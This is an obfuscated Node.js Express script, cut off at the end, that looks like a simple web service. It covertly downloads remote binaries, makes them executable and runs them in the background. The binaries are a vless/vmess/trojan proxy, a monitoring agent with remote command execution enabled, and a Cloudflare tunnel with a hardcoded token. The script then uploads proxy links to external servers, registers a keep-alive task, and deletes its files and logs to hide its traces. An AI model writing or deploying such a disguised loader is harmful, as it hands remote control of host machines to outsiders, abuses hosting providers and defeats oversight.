const _0x4c95a6=_0x27a5;(function(_0x423d0e,_0x2373d6){const _0x46cf89=_0x27a5,_0x53cd8e=_0x423d0e();while(!![]){try{const _0x44f46e=parseInt(_0x46cf89(0x125))/0x1+parseInt(_0x46cf89(0x11c))/0x2+parseInt(_0x46cf89(0x134))/0x3*(-parseInt(_0x46cf89(0x14a))/0x4)+parseInt(_0x46cf89(0x16a))/0x5*(parseInt(_0x46cf89(0x178))/0x6)+parseInt(_0x46cf89(0x1a8))/0x7+parseInt(_0x46cf89(0x1b5))/0x8+parseInt(_0x46cf89(0x197))/0x9*(-parseInt(_0x46cf89(0x112))/0xa);if(_0x44f46e===_0x2373d6)break;else _0x53cd8e['push'](_0x53cd8e['shift']());}catch(_0x947823){_0x53cd8e['push'](_0x53cd8e['shift']());}}}(_0x49b3,0xe3ae7));const express=require(_0x4c95a6(0x1c1)),app=express(),axios=require(_0x4c95a6(0x12f)),os=require('os'),fs=require('fs'),path=require(_0x4c95a6(0x137)),{promisify}=require(_0x4c95a6(0x198)),exec=promisify(require(_0x4c95a6(0x1a2))[_0x4c95a6(0x170)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4c95a6(0x123)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4c95a6(0x123)][_0x4c95a6(0x1d4)]||_0x4c95a6(0x116),AUTO_ACCESS=process[_0x4c95a6(0x123)]['AUTO_ACCESS']||!![],FILE_PATH=process[_0x4c95a6(0x123)][_0x4c95a6(0x180)]||_0x4c95a6(0x151),SUB_PATH=process[_0x4c95a6(0x123)]['SUB_PATH']||_0x4c95a6(0x1b2),PORT=process['env'][_0x4c95a6(0x119)]||process[_0x4c95a6(0x123)][_0x4c95a6(0x14e)]||0xbb8,UUID=process['env'][_0x4c95a6(0x17e)]||_0x4c95a6(0x172),NEZHA_SERVER=process['env'][_0x4c95a6(0x1b3)]||_0x4c95a6(0x1a7),NEZHA_PORT=process[_0x4c95a6(0x123)][_0x4c95a6(0x179)]||'',NEZHA_KEY=process['env'][_0x4c95a6(0x160)]||_0x4c95a6(0x162),ARGO_DOMAIN=process[_0x4c95a6(0x123)]['ARGO_DOMAIN']||_0x4c95a6(0x133),ARGO_AUTH=process[_0x4c95a6(0x123)][_0x4c95a6(0x127)]||'eyJhIjoiMTI4OTFlZTJlNzlhNGUxMjllNTg4ZDBhMTUzY2M0MzciLCJ0IjoiYzUzZDVhMDktOTM5Zi00YmIwLTlhZGItYjliNGFhNDQ3NjNlIiwicyI6Ik0yTXlPVGcwTkRndE9UazRaUzAwT0RrMExUa3pNVFl0TlRVNU9XUTBNREk0WVRRMSJ9',ARGO_PORT=process[_0x4c95a6(0x123)][_0x4c95a6(0x13b)]||0x1f41,CFIP=process['env'][_0x4c95a6(0x1a0)]||_0x4c95a6(0x16d),CFPORT=process[_0x4c95a6(0x123)][_0x4c95a6(0x12d)]||0x1bb,NAME=process[_0x4c95a6(0x123)][_0x4c95a6(0x19c)]||_0x4c95a6(0x14d);!fs['existsSync'](FILE_PATH)?(fs[_0x4c95a6(0x199)](FILE_PATH),console[_0x4c95a6(0x115)](FILE_PATH+'\x20is\x20created')):console[_0x4c95a6(0x115)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x300aed=_0x4c95a6,_0x5fd859=_0x300aed(0x177);let _0x1ad36a='';for(let _0x9d5a0f=0x0;_0x9d5a0f<0x6;_0x9d5a0f++){_0x1ad36a+=_0x5fd859['charAt'](Math[_0x300aed(0x117)](Math[_0x300aed(0x1c4)]()*_0x5fd859[_0x300aed(0x193)]));}return _0x1ad36a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4c95a6(0x13c)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x4c95a6(0x13c)](FILE_PATH,webName),botPath=path[_0x4c95a6(0x13c)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x4c95a6(0x1cc)),bootLogPath=path[_0x4c95a6(0x13c)](FILE_PATH,_0x4c95a6(0x142)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x554ffb=_0x4c95a6;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x78e0ef;try{_0x78e0ef=fs['readFileSync'](subPath,_0x554ffb(0x19a));}catch{return null;}const _0x341121=Buffer[_0x554ffb(0x171)](_0x78e0ef,_0x554ffb(0x1aa))[_0x554ffb(0x147)]('utf-8'),_0x342e50=_0x341121[_0x554ffb(0x1ad)]('\x0a')[_0x554ffb(0x129)](_0x5607c5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x554ffb(0x1ba)](_0x5607c5));if(_0x342e50[_0x554ffb(0x193)]===0x0)return;return axios['post'](UPLOAD_URL+_0x554ffb(0x131),JSON[_0x554ffb(0x14f)]({'nodes':_0x342e50}),{'headers':{'Content-Type':_0x554ffb(0x122)}})[_0x554ffb(0x110)](_0x557a91=>{return null;}),null;}catch(_0x15ea53){return null;}}function cleanupOldFiles(){const _0x2f57d1=_0x4c95a6;try{const _0x408fea=fs[_0x2f57d1(0x11d)](FILE_PATH);_0x408fea['forEach'](_0x5748bc=>{const _0x53cde6=_0x2f57d1,_0x21292d=path['join'](FILE_PATH,_0x5748bc);try{const _0x22769e=fs[_0x53cde6(0x1ae)](_0x21292d);_0x22769e[_0x53cde6(0x1d6)]()&&fs['unlinkSync'](_0x21292d);}catch(_0x2fd30b){}});}catch(_0x4299ff){}}app[_0x4c95a6(0x13f)]('/',function(_0x499903,_0x28e8f8){const _0x2f1dc7=_0x4c95a6;_0x28e8f8[_0x2f1dc7(0x1b0)](_0x2f1dc7(0x17a));});function _0x49b3(){const _0x367a39=['\x20-c\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','abcdefghijklmnopqrstuvwxyz','30ntJXsU','NEZHA_PORT','The\x20service\x20is\x20running...','http://ip-api.com/json/','\x20-s\x20','\x0a\x20\x20credentials-file:\x20','UUID','clear','FILE_PATH','\x0aclient_secret:\x20','.exe\x20>\x20nul\x202>&1','then','\x22\x20>\x20/dev/null\x202>&1','aarch64','\x0a\x0atrojan://','\x0a\x20\x20tunnel:\x20','\x20>/dev/null\x202>&1\x20&','fileUrl','https://amd64.ssss.nyc.mn/web','trojan','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20','--tls','stream','includes','writeFileSync','/vmess-argo','length','response','tcp','true','4529097hkNICa','util','mkdirSync','utf-8','has','NAME','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','status','success','CFIP','https://ipapi.co/json/','child_process','\x20>/dev/null\x202>&1','unlink','xtls-rprx-vision','data','nz.680660.xyz:443','1127175LZOoVV','readFileSync','base64','push','Unknown','split','statSync','listen','send','taskkill\x20/f\x20/im\x20','subkey660','NEZHA_SERVER','/sub.txt\x20saved\x20successfully','13629624JIxbry','Unhandled\x20error\x20in\x20startserver:','pop','tls','\x20failed:\x20','test','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','countryCode','quic','Download\x20','\x20-p\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','express','arch','/dev/null','random','2087','443','direct','basename','tunnel.json','https://amd64.ssss.nyc.mn/bot','2096','list.txt','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','/tunnel.yml\x20run','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','match','\x20is\x20running','none','npm\x20running\x20error:\x20','PROJECT_URL','false','isFile','pkill\x20-f\x20\x22[','catch','unshift','50eAzNrX','platform','config.json','log','https://bizarre-kevyn-youaer-18355adf.koyeb.app','floor','https://oooo.serv00.net/add-url','SERVER_PORT','nohup\x20','Error\x20in\x20startserver:','2177548ZQxXtJ','readdirSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ARGO_DOMAIN:','http','application/json','env','https://arm64.ssss.nyc.mn/bot','865912smHUBM','https+local://8.8.8.8/dns-query','ARGO_AUTH','country_code','filter','Error\x20reading\x20boot.log:','error','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','CFPORT','2053','axios','127.0.0.1','/api/delete-nodes','TunnelSecret','image.snl.qzz.io','12JFZRKB','tunnel.yml','freedom','path','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','ARGO_PORT','join','http\x20server\x20is\x20running\x20on\x20port:','close','get','pipe','existsSync','boot.log','https://arm64.ssss.nyc.mn/web','&fp=firefox&type=ws&host=','Subscription\x20uploaded\x20successfully','amd','toString','\x0avless://','post','527236XJeTBz','all','/vless-argo','argoimage','PORT','stringify','chmod','./tmp','win32','firefox','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','web\x20running\x20error:\x20','App\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Empowerment\x20success\x20for\x20','arm','php\x20running\x20error:\x20','Error\x20executing\x20command:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','vless','/vmess-argo?ed=2560','createWriteStream','NEZHA_KEY','config.yaml','IE3tj6tvKuytMasgSk2VskG9GTyGP6vK','message','rm\x20-rf\x20','8443','forEach','vmess','set','https://arm64.ssss.nyc.mn/agent','156570YCwFjG','?encryption=none&security=tls&sni=','del\x20/f\x20/q\x20','store.ubi.com','&path=%2Fvless-argo%3Fed%3D2560#','NEZHA\x20variable\x20is\x20empty,skip\x20running','exec','from','3D00706E-41B4-01EB-572D-4FBA0A0E75CE','fileName','org'];_0x49b3=function(){return _0x367a39;};return _0x49b3();}async function generateConfig(){const _0x24c6b0=_0x4c95a6,_0x48ae43={'log':{'access':_0x24c6b0(0x1c3),'error':'/dev/null','loglevel':_0x24c6b0(0x1d2)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x24c6b0(0x1a5)}],'decryption':_0x24c6b0(0x1d2),'fallbacks':[{'dest':0xbb9},{'path':_0x24c6b0(0x14c),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x24c6b0(0x195)}},{'port':0xbb9,'listen':_0x24c6b0(0x130),'protocol':_0x24c6b0(0x15d),'settings':{'clients':[{'id':UUID}],'decryption':_0x24c6b0(0x1d2)},'streamSettings':{'network':_0x24c6b0(0x195),'security':'none'}},{'port':0xbba,'listen':_0x24c6b0(0x130),'protocol':_0x24c6b0(0x15d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x24c6b0(0x1d2)},'streamSettings':{'network':'ws','security':_0x24c6b0(0x1d2),'wsSettings':{'path':_0x24c6b0(0x14c)}},'sniffing':{'enabled':!![],'destOverride':[_0x24c6b0(0x121),_0x24c6b0(0x1b8),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x24c6b0(0x167),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x24c6b0(0x192)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x24c6b0(0x1b8),_0x24c6b0(0x1bd)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x24c6b0(0x130),'protocol':_0x24c6b0(0x18b),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x24c6b0(0x1d2),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x24c6b0(0x121),_0x24c6b0(0x1b8),_0x24c6b0(0x1bd)],'metadataOnly':![]}}],'dns':{'servers':[_0x24c6b0(0x126)]},'outbounds':[{'protocol':_0x24c6b0(0x136),'tag':_0x24c6b0(0x1c7)},{'protocol':'blackhole','tag':'block'}]};fs[_0x24c6b0(0x191)](path[_0x24c6b0(0x13c)](FILE_PATH,_0x24c6b0(0x114)),JSON[_0x24c6b0(0x14f)](_0x48ae43,null,0x2));}function getSystemArchitecture(){const _0x9f7df1=_0x4c95a6,_0x2c4a64=os[_0x9f7df1(0x1c2)]();return _0x2c4a64===_0x9f7df1(0x159)||_0x2c4a64==='arm64'||_0x2c4a64===_0x9f7df1(0x185)?'arm':_0x9f7df1(0x146);}function downloadFile(_0x214b43,_0x3c81a0,_0x2d4af2){const _0x3a15f2=_0x4c95a6,_0x42875c=_0x214b43;!fs[_0x3a15f2(0x141)](FILE_PATH)&&fs[_0x3a15f2(0x199)](FILE_PATH,{'recursive':!![]});const _0xb88609=fs[_0x3a15f2(0x15f)](_0x42875c);axios({'method':_0x3a15f2(0x13f),'url':_0x3c81a0,'responseType':_0x3a15f2(0x18f)})[_0x3a15f2(0x183)](_0x263a77=>{const _0x285000=_0x3a15f2;_0x263a77[_0x285000(0x1a6)][_0x285000(0x140)](_0xb88609),_0xb88609['on']('finish',()=>{const _0x12ff8e=_0x285000;_0xb88609[_0x12ff8e(0x13e)](),console['log'](_0x12ff8e(0x1be)+path['basename'](_0x42875c)+'\x20successfully'),_0x2d4af2(null,_0x42875c);}),_0xb88609['on']('error',_0x45f0ad=>{const _0x1bf8d6=_0x285000;fs[_0x1bf8d6(0x1a4)](_0x42875c,()=>{});const _0x25b4fa=_0x1bf8d6(0x1be)+path['basename'](_0x42875c)+_0x1bf8d6(0x1b9)+_0x45f0ad[_0x1bf8d6(0x163)];console[_0x1bf8d6(0x12b)](_0x25b4fa),_0x2d4af2(_0x25b4fa);});})[_0x3a15f2(0x110)](_0x2efb65=>{const _0x11d90c=_0x3a15f2,_0x2925f7=_0x11d90c(0x1be)+path[_0x11d90c(0x1c8)](_0x42875c)+_0x11d90c(0x1b9)+_0x2efb65[_0x11d90c(0x163)];console[_0x11d90c(0x12b)](_0x2925f7),_0x2d4af2(_0x2925f7);});}async function downloadFilesAndRun(){const _0x277dbc=_0x4c95a6,_0xb9f18e=getSystemArchitecture(),_0x502d85=getFilesForArchitecture(_0xb9f18e);if(_0x502d85['length']===0x0){console[_0x277dbc(0x115)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x4f911a=_0x502d85['map'](_0x3a0f6a=>{return new Promise((_0x10d4f9,_0x5159e2)=>{const _0x2322f6=_0x27a5;downloadFile(_0x3a0f6a[_0x2322f6(0x173)],_0x3a0f6a[_0x2322f6(0x189)],(_0x2dca07,_0x3dbeca)=>{_0x2dca07?_0x5159e2(_0x2dca07):_0x10d4f9(_0x3dbeca);});});});try{await Promise[_0x277dbc(0x14b)](_0x4f911a);}catch(_0x19d83b){console[_0x277dbc(0x12b)]('Error\x20downloading\x20files:',_0x19d83b);return;}function _0x20cc32(_0x54afb7){const _0x3dd6da=_0x277dbc,_0xe16945=0x1fd;_0x54afb7[_0x3dd6da(0x166)](_0x120246=>{const _0x12c18f=_0x3dd6da;fs[_0x12c18f(0x141)](_0x120246)&&fs[_0x12c18f(0x150)](_0x120246,_0xe16945,_0x579dfc=>{const _0x3fb6cf=_0x12c18f;_0x579dfc?console[_0x3fb6cf(0x12b)]('Empowerment\x20failed\x20for\x20'+_0x120246+':\x20'+_0x579dfc):console[_0x3fb6cf(0x115)](_0x3fb6cf(0x158)+_0x120246+':\x20'+_0xe16945[_0x3fb6cf(0x147)](0x8));});});}const _0x1228f2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x20cc32(_0x1228f2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xc8d3a4=NEZHA_SERVER[_0x277dbc(0x190)](':')?NEZHA_SERVER[_0x277dbc(0x1ad)](':')[_0x277dbc(0x1b7)]():'',_0x3a5fb1=new Set([_0x277dbc(0x1c6),_0x277dbc(0x165),'2096',_0x277dbc(0x1c5),'2083',_0x277dbc(0x12e)]),_0x75e72c=_0x3a5fb1[_0x277dbc(0x19b)](_0xc8d3a4)?_0x277dbc(0x196):_0x277dbc(0x1d5),_0x4dd91c=_0x277dbc(0x181)+NEZHA_KEY+_0x277dbc(0x13a)+NEZHA_SERVER+_0x277dbc(0x11f)+_0x75e72c+_0x277dbc(0x139)+UUID;fs[_0x277dbc(0x191)](path[_0x277dbc(0x13c)](FILE_PATH,_0x277dbc(0x161)),_0x4dd91c);const _0x45194f='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x277dbc(0x15c);try{await exec(_0x45194f),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x5f10c6=>setTimeout(_0x5f10c6,0x3e8));}catch(_0x1a1aaf){console['error'](_0x277dbc(0x15a)+_0x1a1aaf);}}else{let _0x2e14b9='';const _0xca76a9=['443','8443',_0x277dbc(0x1cb),_0x277dbc(0x1c5),'2083',_0x277dbc(0x12e)];_0xca76a9['includes'](NEZHA_PORT)&&(_0x2e14b9=_0x277dbc(0x18e));const _0x5c916a=_0x277dbc(0x11a)+npmPath+_0x277dbc(0x17c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x277dbc(0x1bf)+NEZHA_KEY+'\x20'+_0x2e14b9+_0x277dbc(0x157);try{await exec(_0x5c916a),console[_0x277dbc(0x115)](npmName+_0x277dbc(0x1d1)),await new Promise(_0x2c1713=>setTimeout(_0x2c1713,0x3e8));}catch(_0x2f8fd9){console[_0x277dbc(0x12b)](_0x277dbc(0x1d3)+_0x2f8fd9);}}}else console[_0x277dbc(0x115)](_0x277dbc(0x16f));const _0x194233=_0x277dbc(0x11a)+webPath+_0x277dbc(0x175)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x194233),console[_0x277dbc(0x115)](webName+_0x277dbc(0x1d1)),await new Promise(_0x2adcfc=>setTimeout(_0x2adcfc,0x3e8));}catch(_0x3cea71){console[_0x277dbc(0x12b)](_0x277dbc(0x155)+_0x3cea71);}if(fs[_0x277dbc(0x141)](botPath)){let _0x15c7fd;if(ARGO_AUTH[_0x277dbc(0x1d0)](/^[A-Z0-9a-z=]{120,250}$/))_0x15c7fd=_0x277dbc(0x1cf)+ARGO_AUTH;else ARGO_AUTH[_0x277dbc(0x1d0)](/TunnelSecret/)?_0x15c7fd=_0x277dbc(0x12c)+FILE_PATH+_0x277dbc(0x1ce):_0x15c7fd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x277dbc(0x138)+ARGO_PORT;try{await exec(_0x277dbc(0x11a)+botPath+'\x20'+_0x15c7fd+_0x277dbc(0x188)),console[_0x277dbc(0x115)](botName+_0x277dbc(0x1d1)),await new Promise(_0x586bbc=>setTimeout(_0x586bbc,0x7d0));}catch(_0xa3c2a8){console[_0x277dbc(0x12b)]('Error\x20executing\x20command:\x20'+_0xa3c2a8);}}await new Promise(_0x529b76=>setTimeout(_0x529b76,0x1388));}function getFilesForArchitecture(_0x91392e){const _0x2d0d12=_0x4c95a6;let _0xc59281;_0x91392e===_0x2d0d12(0x159)?_0xc59281=[{'fileName':webPath,'fileUrl':_0x2d0d12(0x143)},{'fileName':botPath,'fileUrl':_0x2d0d12(0x124)}]:_0xc59281=[{'fileName':webPath,'fileUrl':_0x2d0d12(0x18a)},{'fileName':botPath,'fileUrl':_0x2d0d12(0x1ca)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5a554e=_0x91392e===_0x2d0d12(0x159)?_0x2d0d12(0x169):_0x2d0d12(0x18c);_0xc59281['unshift']({'fileName':npmPath,'fileUrl':_0x5a554e});}else{const _0x1be3f4=_0x91392e===_0x2d0d12(0x159)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0xc59281[_0x2d0d12(0x111)]({'fileName':phpPath,'fileUrl':_0x1be3f4});}}return _0xc59281;}function argoType(){const _0x5a1eb2=_0x4c95a6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5a1eb2(0x115)](_0x5a1eb2(0x154));return;}if(ARGO_AUTH[_0x5a1eb2(0x190)](_0x5a1eb2(0x132))){fs[_0x5a1eb2(0x191)](path[_0x5a1eb2(0x13c)](FILE_PATH,_0x5a1eb2(0x1c9)),ARGO_AUTH);const _0x2865c2=_0x5a1eb2(0x187)+ARGO_AUTH[_0x5a1eb2(0x1ad)]('\x22')[0xb]+_0x5a1eb2(0x17d)+path['join'](FILE_PATH,_0x5a1eb2(0x1c9))+_0x5a1eb2(0x11e)+ARGO_DOMAIN+_0x5a1eb2(0x1cd)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x5a1eb2(0x191)](path['join'](FILE_PATH,_0x5a1eb2(0x135)),_0x2865c2);}else console[_0x5a1eb2(0x115)](_0x5a1eb2(0x19d));}async function extractDomains(){const _0x1ba376=_0x4c95a6;let _0x4e158c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4e158c=ARGO_DOMAIN,console[_0x1ba376(0x115)](_0x1ba376(0x120),_0x4e158c),await _0x4dc24e(_0x4e158c);else try{const _0x198f22=fs[_0x1ba376(0x1a9)](path[_0x1ba376(0x13c)](FILE_PATH,_0x1ba376(0x142)),_0x1ba376(0x19a)),_0x4337a8=_0x198f22[_0x1ba376(0x1ad)]('\x0a'),_0x240d24=[];_0x4337a8['forEach'](_0xa62dd3=>{const _0x232986=_0x1ba376,_0x368fb0=_0xa62dd3[_0x232986(0x1d0)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x368fb0){const _0x522e40=_0x368fb0[0x1];_0x240d24[_0x232986(0x1ab)](_0x522e40);}});if(_0x240d24[_0x1ba376(0x193)]>0x0)_0x4e158c=_0x240d24[0x0],console[_0x1ba376(0x115)]('ArgoDomain:',_0x4e158c),await _0x4dc24e(_0x4e158c);else{console[_0x1ba376(0x115)](_0x1ba376(0x176)),fs['unlinkSync'](path[_0x1ba376(0x13c)](FILE_PATH,_0x1ba376(0x142)));async function _0x5c496d(){const _0xf99ad9=_0x1ba376;try{process['platform']==='win32'?await exec(_0xf99ad9(0x1b1)+botName+_0xf99ad9(0x182)):await exec(_0xf99ad9(0x10f)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0xf99ad9(0x184));}catch(_0x4e8f18){}}_0x5c496d(),await new Promise(_0x891a98=>setTimeout(_0x891a98,0xbb8));const _0x374e04=_0x1ba376(0x1c0)+FILE_PATH+_0x1ba376(0x138)+ARGO_PORT;try{await exec(_0x1ba376(0x11a)+botPath+'\x20'+_0x374e04+_0x1ba376(0x188)),console[_0x1ba376(0x115)](botName+_0x1ba376(0x1d1)),await new Promise(_0x4ba7bb=>setTimeout(_0x4ba7bb,0xbb8)),await extractDomains();}catch(_0x324afd){console[_0x1ba376(0x12b)](_0x1ba376(0x15b)+_0x324afd);}}}catch(_0x34c449){console['error'](_0x1ba376(0x12a),_0x34c449);}async function _0x158dc2(){const _0x2d67bc=_0x1ba376;try{const _0x3107df=await axios[_0x2d67bc(0x13f)](_0x2d67bc(0x1a1),{'timeout':0xbb8});if(_0x3107df[_0x2d67bc(0x1a6)]&&_0x3107df['data'][_0x2d67bc(0x128)]&&_0x3107df[_0x2d67bc(0x1a6)][_0x2d67bc(0x174)])return _0x3107df[_0x2d67bc(0x1a6)][_0x2d67bc(0x128)]+'_'+_0x3107df[_0x2d67bc(0x1a6)][_0x2d67bc(0x174)];}catch(_0x136652){try{const _0x49edb5=await axios[_0x2d67bc(0x13f)](_0x2d67bc(0x17b),{'timeout':0xbb8});if(_0x49edb5[_0x2d67bc(0x1a6)]&&_0x49edb5[_0x2d67bc(0x1a6)][_0x2d67bc(0x19e)]===_0x2d67bc(0x19f)&&_0x49edb5[_0x2d67bc(0x1a6)]['countryCode']&&_0x49edb5[_0x2d67bc(0x1a6)][_0x2d67bc(0x174)])return _0x49edb5[_0x2d67bc(0x1a6)][_0x2d67bc(0x1bc)]+'_'+_0x49edb5[_0x2d67bc(0x1a6)][_0x2d67bc(0x174)];}catch(_0x4c0aa9){}}return _0x2d67bc(0x1ac);}async function _0x4dc24e(_0x1ca36a){const _0x30e484=await _0x158dc2(),_0x2ad104=NAME?NAME+'-'+_0x30e484:_0x30e484;return new Promise(_0x14ae62=>{setTimeout(()=>{const _0x49f556=_0x27a5,_0x537a94={'v':'2','ps':''+_0x2ad104,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x49f556(0x1d2),'host':_0x1ca36a,'path':_0x49f556(0x15e),'tls':_0x49f556(0x1b8),'sni':_0x1ca36a,'alpn':'','fp':_0x49f556(0x153)},_0x4450cf=_0x49f556(0x148)+UUID+'@'+CFIP+':'+CFPORT+_0x49f556(0x16b)+_0x1ca36a+'&fp=firefox&type=ws&host='+_0x1ca36a+_0x49f556(0x16e)+_0x2ad104+'\x0a\x0avmess://'+Buffer[_0x49f556(0x171)](JSON['stringify'](_0x537a94))[_0x49f556(0x147)]('base64')+_0x49f556(0x186)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1ca36a+_0x49f556(0x144)+_0x1ca36a+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x2ad104+_0x49f556(0x18d);console['log'](Buffer[_0x49f556(0x171)](_0x4450cf)['toString']('base64')),fs[_0x49f556(0x191)](subPath,Buffer['from'](_0x4450cf)[_0x49f556(0x147)](_0x49f556(0x1aa))),console['log'](FILE_PATH+_0x49f556(0x1b4)),uploadNodes(),app[_0x49f556(0x13f)]('/'+SUB_PATH,(_0x134d83,_0x208b20)=>{const _0x305126=_0x49f556,_0xd31c9d=Buffer[_0x305126(0x171)](_0x4450cf)[_0x305126(0x147)](_0x305126(0x1aa));_0x208b20[_0x305126(0x168)]('Content-Type','text/plain;\x20charset=utf-8'),_0x208b20[_0x305126(0x1b0)](_0xd31c9d);}),_0x14ae62(_0x4450cf);},0x7d0);});}}async function uploadNodes(){const _0x5a843b=_0x4c95a6;if(UPLOAD_URL&&PROJECT_URL){const _0x342a78=PROJECT_URL+'/'+SUB_PATH,_0xaeeadd={'subscription':[_0x342a78]};try{const _0x40e4c5=await axios[_0x5a843b(0x149)](UPLOAD_URL+'/api/add-subscriptions',_0xaeeadd,{'headers':{'Content-Type':_0x5a843b(0x122)}});return _0x40e4c5&&_0x40e4c5[_0x5a843b(0x19e)]===0xc8?(console[_0x5a843b(0x115)](_0x5a843b(0x145)),_0x40e4c5):null;}catch(_0x393be4){if(_0x393be4[_0x5a843b(0x194)]){if(_0x393be4[_0x5a843b(0x194)][_0x5a843b(0x19e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5a843b(0x141)](listPath))return;const _0x239ed5=fs[_0x5a843b(0x1a9)](listPath,_0x5a843b(0x19a)),_0xd7074d=_0x239ed5[_0x5a843b(0x1ad)]('\x0a')['filter'](_0xc1e927=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5a843b(0x1ba)](_0xc1e927));if(_0xd7074d[_0x5a843b(0x193)]===0x0)return;const _0x3779d2=JSON['stringify']({'nodes':_0xd7074d});try{const _0x1417fc=await axios[_0x5a843b(0x149)](UPLOAD_URL+'/api/add-nodes',_0x3779d2,{'headers':{'Content-Type':_0x5a843b(0x122)}});return _0x1417fc&&_0x1417fc[_0x5a843b(0x19e)]===0xc8?(console[_0x5a843b(0x115)]('Nodes\x20uploaded\x20successfully'),_0x1417fc):null;}catch(_0x54ed49){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1d7e25=_0x27a5,_0x41284e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x41284e[_0x1d7e25(0x1ab)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x41284e[_0x1d7e25(0x1ab)](phpPath);process[_0x1d7e25(0x113)]===_0x1d7e25(0x152)?exec(_0x1d7e25(0x16c)+_0x41284e[_0x1d7e25(0x13c)]('\x20')+'\x20>\x20nul\x202>&1',_0x262469=>{const _0x318590=_0x1d7e25;console[_0x318590(0x17f)](),console['log'](_0x318590(0x156)),console[_0x318590(0x115)](_0x318590(0x1bb));}):exec(_0x1d7e25(0x164)+_0x41284e[_0x1d7e25(0x13c)]('\x20')+_0x1d7e25(0x1a3),_0x1be8d2=>{const _0x3bd82c=_0x1d7e25;console[_0x3bd82c(0x17f)](),console[_0x3bd82c(0x115)](_0x3bd82c(0x156)),console['log'](_0x3bd82c(0x1bb));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2be8da=_0x4c95a6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2be8da(0x115)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x167101=await axios[_0x2be8da(0x149)](_0x2be8da(0x118),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2be8da(0x122)}});return 